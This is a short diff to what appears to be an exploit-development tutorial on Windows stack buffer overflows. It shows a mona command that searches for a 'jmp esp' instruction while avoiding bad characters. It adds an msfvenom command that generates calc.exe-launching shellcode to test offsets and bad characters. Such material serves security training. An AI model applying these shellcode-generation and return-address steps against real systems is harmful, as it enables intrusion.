@@ -219,6 +219,11 @@ The mona find command can similarly be used to find specific instructions, thoug
 .. code-block:: none
 
     !mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\x00\x0a\x0d"
+    
+Popping cal.exe to test offset, bad chars and JMP ESP (if needed)   
+
+     msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python -v payload     
+
 
 Generate Payload
 ================
